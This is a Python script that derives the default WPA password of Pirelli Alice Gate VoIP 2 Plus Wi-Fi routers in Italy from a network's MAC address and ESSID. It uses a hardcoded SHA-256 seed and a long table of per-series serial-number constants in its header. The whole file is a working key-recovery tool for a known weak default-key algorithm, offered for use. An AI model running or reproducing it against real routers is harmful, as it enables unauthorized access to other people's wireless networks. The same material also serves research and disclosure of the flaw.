#!/usr/bin/env python
# -*- coding: utf-8 -*-

# www.ednolo.alumnos.upv.es

'''

Original link:    http://wifiresearchers.wordpress.com/2010/06/02/alice-agpf-lalgoritmo/
                  http://wiickedz.wordpress.com/2011/03/09/alice-lista-magic-numbers-aggiornata/
Coded by : Eduardo Novella   http://www.ednolo.alumnos.upv.es

Changelog:
---------------
XXXXXXXXXX v0.2.0  + Added more 210 ESSIDS news!! :D
2013/07/10 v0.1.1  + Added stdout parameter for making a module.
2013/07/03 v0.1.0  + First commit

PIRELLI Alice Gate VoIP 2 Plus Wi-Fi
--------------------------------------------------------   
Alice-96xxxxxx Series: 69102X ******* k = 13 Q =96017051
Alice-93xxxxxx Series: 69101X ******* k = 13 Q =92398366
Alice-56xxxxxx Series: 67902X ******* k = 13 Q =54808800
Alice-55xxxxxx Series: 67904X ******* k = 8  Q =55164449
Alice-54xxxxxx Series: 67903X ******* k = 8  Q =52420689
Alice-48xxxxxx Series: 67903X ******* k = 8  Q =47896103
Alice-46xxxxxx Series: 67902X ******* k = 13 Q =39015145 


SSID,SERIAL,K,Q,MAC ADDRESS

“995,69102,13,99208960,001D8B”;
“966,69102,13,96214846,001D8B”;
“965,69102,13,96214846,001D8B”;
“964,67902,13,95026672,001D8B”;
“962,67902,13,95027335,001D8B”;
“961,69102,13,96017051,001D8B”;
“960,69102,13,96017051,001D8B”;
“958,67902,13,94829072,001D8B”;
“957,67902,13,94831022,001D8B”;
“956,67902,13,94831022,001D8B”;
“955,67902,13,94828422,001D8B”;
“954,67902,13,94831022,001D8B”;
“953,67902,13,94829137,001D8B”;
“952,67902,13,94829137,001D8B”;
“951,67902,13,94829137,001D8B”;
“950,67902,13,94831022,001D8B”;
“950,67902,13,94830515,001D8B”;
“949,67902,13,94830515,001D8B”;
“948,67902,13,94830515,001D8B”;
“945,67901,13,92873664,001D8B”;
“943,67901,13,92873664,001D8B”;
“938,69101,13,91472696,001D8B”;
“936,69101,13,92723407,001D8B”;
“935,69101,13,92727307,001D8B”;
“933,67901,13,92016972,001D8B”;
“932,69101,13,93062432,001D8B”;
“932,67901,13,92016972,001D8B”;
“931,69101,13,92398366,001D8B”;
“928,69101,13,92303856,001D8B”;
“927,69101,13,92303856,001D8B”;
“923,69101,13,92017687,001D8B”;
“922,67901,13,91105594,001D8B”;
“865,67901,13,85548341,001D8B”;
“864,67901,13,85548341,001D8B”;
“863,67901,13,85548341,001D8B”;
“862,67901,13,85548341,001D8B”;
“861,67901,13,85535341,001D8B”;
“860,67901,13,85535341,001D8B”;
“858,67901,13,85518805,001D8B”;
“857,67901,13,85518805,001D8B”;
“857,69101,13,85507196,001D8B”;
“82 ,67901,13,82777468,001CA2″;
“653,67904,8,62415297,002553″;
“649,67904,8,62415249,002553″;
“648,67904,8,62415297,002553″;
“646,67904,8,62415297,002553″;
“645,67904,8,62415297,002553″;
“642,69104,8,63703777,002553″;
“641,67904,8,62254897,002553″;
“639,67904,8,62254897,002553″;
“638,67904,8,62254897,002553″;
“637,67904,8,62246897,002553″;
“636,67904,8,62246897,002553″;
“636,67904,8,55226258,002553″;
“636,67904,8,62360145,002553″;
“635,67904,8,62230897,002553″;
“634,67904,8,62238897,002553″;
“633,67904,8,62239057,002553″;
“633,69104,8,62903297,002553″;
“631,67904,8,62219249,002553″;
“631,67904,8,62193097,002553″;
“630,67904,8,62220849,002553″;
“629,67904,8,62220849,002553″;
“627,67904,8,61855721,002553″;
“627,69104,8,62345169,002553″;
“627,67904,8,62174801,002553″;
“626,69104,8,62345169,002553″;
“625,69104,8,62345169,002553″;
“624,69104,8,62345153,002553″;
“623,67904,8,61884537,002553″;
“622,67904,8,61884537,002553″;
“62X,67904,8,62174801,002553″;
“588,69102,13,56695373,002233″;
“587,69102,13,56695945,002233″;
“586,69102,13,56695945,002233″;
“585,67902,13,55485918,002233″;
“584,67902,13,55485918,002233″;
“583,67902,13,55485918,002233″;
“582,67902,13,55485918,002233″;
“581,69102,13,56332816,002233″;
“580,69102,13,56332816,002233″;
“579,69102,13,56332816,002233″;
“578,67902,13,55119942,002233″;
“577,67902,13,55119942,002233″;
“576,67902,13,55119942,002233″;
“574,69102,13,55844913,002233″;
“574,69102,13,55844900,002233″;
“573,69102,13,55844913,002233″;
“571,67902,13,54791692,002233″;
“571,69102,13,55844900,002233″;
“570,67902,13,54791692,002233″;
“569,67902,13,54809242,002233″;
“569,67902,13,54805992,002233″;
“568,67902,13,54805992,002233″;
“567,67902,13,54808800,002233″;
“566,67902,13,54808800,002233″;
“565,67902,13,54808800,002233″;
“564,67902,13,54808800,002233″;
“563,67902,13,54808800,002233″;
“562,67902,13,54808800,002233″;
“561,69102,13,55052472,002233″;
“560,67902,13,54809242,002233″;
“559,69102,13,54778588,002233″;
“558,69102,13,54811868,002233″;
“557,69102,13,54811868,002233″;
“556,69102,13,54811868,002233″;
“555,67904,8,55164449,002553″;
“555,69102,13,54811868,002233″;
“554,67904,8,55164449,002553″;
“553,67904,8,55164449,002553″;
“552,67904,8,55164449,002553″;
“551,67904,8,55164449,002553″;
“551,67903,8,52420697,002553″;
“550,67903,8,52420697,002553″;
“550,67903,8,52420689,002553″;
“549,67903,8,52420689,002553″;
“548,67903,8,52420689,002553″;
“548,67903,8,52420673,002553″;
“547,67903,8,52420689,002553″;
“546,67903,8,52420689,002553″;
“545,67903,8,52420689,002553″;
“544,67903,8,52420689,002553″;
“543,67903,8,52420689,002553″;
“542,67903,8,52420673,002553″;
“542,67903,8,52420689,002553″;
“541,67903,8,52420689,002553″;
“540,67903,8,52420689,002553″;
“539,67903,8,52420689,002553″;
“538,67903,8,52420681,002553″;
“537,67903,8,52420681,002553″;
“536,67903,8,52420689,002553″;
“535,67903,8,52420689,002553″;
“534,67903,8,52420681,002553″;
“533,67903,8,52420689,002553″;
“532,69103,8,52845953,002553″;
“531,69103,8,52845953,002553″;
“530,67903,8,52196329,002553″;
“529,67903,8,52196329,002553″;
“528,67903,8,52196329,002553″;
“527,67903,8,52196329,002553″;
“526,69103,8,52418353,002553″;
“526,67903,8,52196329,002553″;
“525,69103,8,52418353,002553″;
“524,69103,8,52418353,002553″;
“490,69101,13,48968681,001CA2″;
“487,67901,13,48559740,001CA2″;
“483,67903,8,47896103,00238E”;
“482,67903,8,47896103,00238E”;
“481,67903,8,47896103,00238E”;
“480,67903,8,47896103,00238E”;
“479,67903,8,47955247,00238E”;
“476,69102,13,43892099,00238E”;
“476,69102,13,43892021,00238E”;
“475,69102,13,43892021,00238E”;
“474,69102,13,43892099,00238E”;
“471,67902,13,39177168,00238E”;
“470,67902,13,39184782,00238E”;
“470,67902,13,38678445,00238E”;
“465,67902,13,39015145,00238E”;
“464,67902,13,39014716,00238E”;
“463,67902,13,39014716,00238E”;
“461,67902,13,39015145,00238E”;
“460,67902,13,39010595,00238E”;
“459,67902,13,39004095,00238E”;
“458,67902,13,39010595,0017C2″;
“457,67902,13,39010595,00238E”;
“455,67902,13,39010595,00238E”;
“454,67902,13,39010335,00238E”;
“453,67902,13,39010335,00238E”;
“451,67902,13,39010335,00238E”;
“449,67902,13,38883455,00238E”;
“448,67902,13,38883455,00238E”;
“447,67902,13,38883455,00238E”;
“446,67902,13,38767105,00238E”;
“445,67902,13,38767105,00238E”;
“444,67902,13,38767105,00238E”;
“44X,67902,13,44156697,00238E”;
“430,67901,13,43008155,00238E”;
“427,69101,13,42667449,001CA2″;
“390,67902,13,33775765,00238E”;
“390,69102,13,35639029,00238E”;
“387,69102,13,35639029,00238E”;
“386,69102,13,35639029,00238E”;
“385,69102,13,35639029,00238E”;
“385,67902,13,33042526,00238E”;
“384,67902,13,33042526,00238E”;
“383,69102,13,35639029,00238E”;
“382,69102,13,35639029,00238E”;
“382,67902,13,33175048,00238E”;
“377,67902,13,33175048,00238E”;
“377,67902,13,33175058,00238E”;
“376,67902,13,33175048,00238E”;
“375,67902,13,33175048,00238E”;
“369,67902,13,32716668,00238E”;
“368,67902,13,32719840,00238E”;
“367,67902,13,32720035,00238E”;
“366,67902,13,32720035,00238E”;
“365,67902,13,32720035,00238E”;
“364,67902,13,32720035,00238E”;
“363,67902,13,32720035,00238E”;
“362,67902,13,32720035,00238E”;
“361,67902,13,32720035,00238E”;
“312,67904,8,28190287,38229D”;
“181,67902,13,17728255,00268D”;
“181,67902,13,14496838,00268D”;
“181,67902,13,13921842,00268D”;
“181,67902,13,14825009,00268D”;
“181,67901,13,16874837,00268D”;
“181,67902,13,17122778,00268D”;
“181,69102,13,16313301,00268D”;
“181,67904,8,17574389,00268D”;
“181,67904,8,18042064,00268D”;
“181,69102,13,17315130,00268D”;
“181,67902,13,15578953,00268D”;


'''

import re
import sys
import hashlib

VERSION     = 0
SUBVERSION  = 1
RELEASE     = 1
DATEVERSION = '2013/07/10' 
URL         = 'http://www.ednolo.alumnos.upv.es'

sndic = {"96" : ["69102X",13,96017051],
         "93" : ["69101X",13,92398366],
         "56" : ["67902X",13,54808800],
         "55" : ["67904X", 8,55164449],
         "54" : ["67903X", 8,52420689],
         "48" : ["67903X", 8,47896103],
         "46" : ["67902X",13,39015145]}
         

def gen_key(sn,mac,stdout="True"):
    seed = ('\x64\xC6\xDD\xE3\xE5\x79\xB6\xD9\x86\x96\x8D\x34\x45\xD2\x3B\x15' +
            '\xCA\xAF\x12\x84\x02\xAC\x56\x00\x05\xCE\x20\x75\x91\x3F\xDC\xE8')
    
    lookup = '0123456789abcdefghijklmnopqrstuvwxyz'

    h = hashlib.sha256()
    h.update(seed)
    h.update(sn)
    h.update(mac)

    digest = bytearray(h.digest())
    
    if (stdout):
        print "[+] SHA256 : %s" % h.hexdigest()

    return ''.join([lookup[x % len(lookup)] for x in digest[0:24]])

def calculateSerialNumber(essid_8nr):

    for k in sndic.iterkeys():
        if ( essid_8nr[:2] == k ):
            sn1,K,Q = sndic[k]
            sn2 = ((int(essid_8nr)-Q)/K)
            return (sn1+str(sn2))                  
            
    return False

def banner():
    print ' --------------------------------------------------------------------'
    print '|                PIRELLI Alice Gate VoIP 2 Plus Wi-Fi   (ITALY)      |'
    print '|--------------------------------------------------------------------|'
    print '|                 Default WPA Key Algorithm Weakness                 |'
    print '|               Eduardo Novella <@enovella_>                         |'
    print ' --------------------------------------------------------------------' 
    print '%s %d.%d.%d    %s    [%s]\n\n' %(sys.argv[0], VERSION, SUBVERSION,RELEASE,DATEVERSION,URL)      

def main():

    banner()   
    if len(sys.argv) != 3:
        print '\t usage: python %s [MAC]  [ESSID]\n' %sys.argv[0]
        print '\t eg. python %s  00:23:8E:01:02:03  Alice-96345678'  %sys.argv[0]
        sys.exit()

    
    mac_str   = re.sub(r'[^a-fA-F0-9]', '', sys.argv[1])
    essid_8nr = re.sub(r'[^0-9]','', sys.argv[2])
    
    if len(mac_str) != 12:
        sys.exit('[!] Check MAC format!\n')
   
    if len(essid_8nr) != 8:
        sys.exit("[!] Check your Essid. Requires 8 numeric digits")
    
    mac = bytearray.fromhex(mac_str)
    
    sn = calculateSerialNumber(essid_8nr)
    if not (sn):
        sys.exit("[!] Check your ESSID! Because we cannot calculate your SN\n")
    
    print '[+] SSID   : Alice-%08s' % (essid_8nr )
    print '[+] MAC    : %s ' % (mac_str)
    print '[+] WPA key: %s'  % (gen_key(sn,mac))
   



if __name__ == "__main__":
    main()

